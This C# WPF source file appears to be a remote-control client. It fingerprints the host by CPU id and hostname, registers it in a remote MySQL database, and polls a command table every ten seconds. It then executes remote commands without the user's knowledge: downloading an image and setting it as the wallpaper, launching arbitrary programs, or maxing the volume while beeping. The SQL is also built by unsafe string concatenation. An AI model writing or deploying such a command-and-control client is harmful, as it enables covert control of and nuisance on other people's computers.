using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using MySql.Data.MySqlClient;

namespace YWV4
{
    public partial class MainWindow : Window
    {
        #region sys variables
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 1;
        public const int SPIF_SENDCHANGE = 2;

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
        #endregion

        private static string cpuId = null;
        static WebClient client = new WebClient();

        public MainWindow()
        {
            InitializeComponent();
        }

        private void MainWin_Loaded(object sender, RoutedEventArgs e)
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            MySqlConnection conn = connect();

            #region pid

            try
            {
                if (cpuId == null)
                {
                    var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
                    ManagementObjectCollection mbsList = mbs.Get();

                    cpuId = mbsList
                    .OfType<ManagementObject>()
                    .First()["ProcessorId"]
                    .ToString();
                }

                string sentence = "INSERT INTO link_device (pid, hostname) VALUES(\"" + cpuId + "\",\"" + Environment.MachineName + "\");";
                MySqlCommand cmd = new MySqlCommand(sentence, conn);
                cmd.ExecuteNonQuery();
            }
            catch (Exception exec)
            {
                logError(exec);
            }

            #endregion

            checkActions(conn);
        }

        #region DB
        MySqlConnection connect()
        {
            try {
                string serverparams = @"server=" + config.SERVER_ADDR + ";userid=" + config.USER + ";password=" + config.PASSWORD + ";database=" + config.DB_NAME;

                MySqlConnection conn = new MySqlConnection(serverparams);
                conn.Open();
                return conn;
            }
            catch (Exception e) {
                logError(e);
                return null;
            }
        }
        #endregion

        #region code
        async void checkActions(MySqlConnection conn)
        {
            while (true)
            {
                if (conn != null && conn.Ping())
                {
                    string sentence = "SELECT * FROM actions;";
                    MySqlCommand cmd = new MySqlCommand(sentence, conn);
                    MySqlDataReader reader = cmd.ExecuteReader();

                    while (reader.Read())
                    {
                        doAction(reader.GetString(1), reader.GetString(2), reader.GetString(3));
                    }
                    reader.Close();
                }
                await Task.Delay(10000);
            }
        }

        void doAction(params string[] _params)
        {
            try
            {
                if (_params[0] == cpuId)
                {
                    if (_params[1] == "setBackground")
                    {
                        string imgPath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\" + generateUID() + ".tmp";
                        client.DownloadFile(_params[2], imgPath);
                        setBackground(imgPath);
                        System.IO.File.Delete(imgPath);
                    }
                    else if (_params[1] == "startProgram")
                    {
                        System.Diagnostics.Process.Start(_params[2]);
                    }
                    else if (_params[1] == "loudAudioBeep")
                    {
                        for (int i = 0; i < 44; i++)
                        {
                            Console.WriteLine(i);
                            keybd_event((byte)System.Windows.Forms.Keys.VolumeUp, 0, 0, 0);
                            Console.Beep();
                        }
                    }
                }
            }
            catch (Exception e)
            {
                logError(e);
            }
        }
        #endregion

        #region utils

        string generateUID()
        {
            Random rand = new Random();
            return "a019975e-db3b-" + rand.Next(100, 999) + "d-ade6-259a5a5fd1f1";
        }

        #endregion

        #region functions
        private static void logError(Exception exec)
        {
            System.IO.File.WriteAllText(Environment.CurrentDirectory + "/errors.log", exec.Message + exec.StackTrace);
        }

        public static void setBackground(string imagePath)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imagePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        #endregion
    }
}
